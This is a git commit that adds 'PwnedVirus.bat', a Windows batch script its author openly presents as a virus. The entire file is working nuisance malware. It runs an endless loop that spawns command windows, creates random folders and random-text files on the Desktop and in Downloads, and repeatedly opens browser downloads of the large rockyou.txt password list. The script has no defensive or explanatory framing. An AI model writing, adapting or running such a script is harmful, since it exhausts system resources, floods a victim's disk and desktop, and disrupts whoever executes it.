7559e1a9a800fe41518d5a0eca0b5df06e9a21f7
Andrew The Skid <121377353+AndrewTheSkid@users.noreply.github.com>
2023-04-09 00:05:23 -0700

    PwnedVirus.bat
    kinda simple but does alot

---
+++ PwnedVirus.bat
@@ -0,0 +1,76 @@
+@echo off
+title Pwned
+:pwned
+   cmd
+   cmd
+   cmd
+   cmd
+   cmd
+   cmd
+   cmd
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\Downloads\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+   md %USERPROFILE%\desktop\%random%
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Downloads\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+  echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\Desktop\%random%.txt"
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+start https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+goto pwned
+
